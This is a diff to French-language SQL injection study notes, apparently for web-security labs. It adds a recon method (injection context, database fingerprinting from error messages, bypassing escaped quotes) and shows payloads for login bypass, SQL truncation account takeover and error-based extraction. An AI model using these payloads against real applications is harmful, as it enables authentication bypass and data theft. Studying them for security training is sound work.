@@ -10,7 +10,7 @@ Points de vigilance avant toute injection :
 - **Scripting** : essentiel, plus fiable que l'Intruder de Burp.
 - **CheatSheet** : https://portswigger.net/web-security/sql-injection/cheat-sheet
 
-Payload de base :
+Payload de base (Oracle / Postgres / SQLite — `||` concatène ; sur MySQL c'est un OR logique) :
 
 ```text
 ' || ( INJECTION ) --
@@ -33,6 +33,36 @@ Commenter la vérification du mot de passe pour se connecter sans lui.
 administrator'--
 ```
 
+## Recon (avant d'injecter)
+
+Trois questions à trancher **avant tout payload**. Les sauter = coller un payload au hasard sur le mauvais SGBD ou le mauvais contexte (cause de la plupart des échecs). On part du signal observable, pas d'un catalogue mémorisé.
+
+**1. Contexte** — où atterrit l'entrée ? Détermine comment sortir de la requête.
+
+```text
+'        → erreur = string literal   WHERE x='INPUT'   (sortir avec ' puis --)
+1+1 → 2  → numérique                 WHERE id=INPUT    (pas de quote)
+,1 OK / UNION KO → identifiant       ORDER BY INPUT    (pas de UNION, injecter après ASC)
+```
+
+**2. SGBD** — quelle syntaxe utiliser ? Le plus souvent lu directement dans le message d'erreur :
+
+```text
+LINE n: ... ^              → PostgreSQL
+...near '...' at line n    → MySQL / MariaDB
+ORA-01234                  → Oracle
+Incorrect syntax near      → MS SQL Server
+```
+
+Sinon, tester une fonction version : `version()` (MySQL/PG), `@@version` (MySQL/MSSQL), `sqlite_version()`, `SELECT banner FROM v$version` (Oracle).
+
+**3. Quotes échappées ?** — l'appli double/échappe les `'` ?
+
+```text
+envoyer  ,'a'  → si l'erreur montre  ''a''  → littéraux interdits (addslashes/magic_quotes)
+               → contourner : chr(97)||chr...  current_schema()  0x hex
+```
+
 ## SQL Truncation
 
 Vuln de stockage, pas d'injection (zéro métacaractère). MySQL non-strict tronque `VARCHAR(n)` en silence, et `=` complète avec des espaces. On duplique un compte existant (`admin`) avec son propre mot de passe.
@@ -46,7 +76,6 @@ login=admin%20%20%20%20%20%20%201&password=monpass
 ```
 
 `admin` + 7 espaces + `1` = 13 car. → passe l'unicité → tronqué à 12 (`admin` + 7 espaces) → `= 'admin'` par padding. Le `1` force le dépassement et survit au trim. **Pas de quotes.** Puis login `admin` / `monpass`.
-
 
 ## UNION attacks
 
@@ -132,7 +161,7 @@ Le `trackingId` est utilisé dans une requête dont le résultat change l'affich
 
 ### Exploiter une réponse conditionnelle
 
-Forcer une erreur (division par zéro) quand la condition est vraie ; pas d'erreur = condition fausse. `FROM dual` est spécifique à Oracle.
+Forcer une erreur (division par zéro) quand la condition est vraie ; pas d'erreur = condition fausse. `TO_CHAR`, `FROM dual`, `ROWNUM` ci-dessous sont **spécifiques Oracle**.
 
 1. **Confirmer la vulnérabilité** :
 
@@ -162,7 +191,7 @@ Forcer une erreur (division par zéro) quand la condition est vraie ; pas d'erre
 
 ### Exploiter un message d'erreur verbeux
 
-Quand la base renvoie le détail de l'erreur, l'exploiter pour lire des données.
+Quand la base renvoie le détail de l'erreur, on y lit la donnée directement. Le payload dépend du SGBD (cf. Recon étape 2).
 
 1. Vérifier que le point est exploitable.
 2. Vérifier la syntaxe :
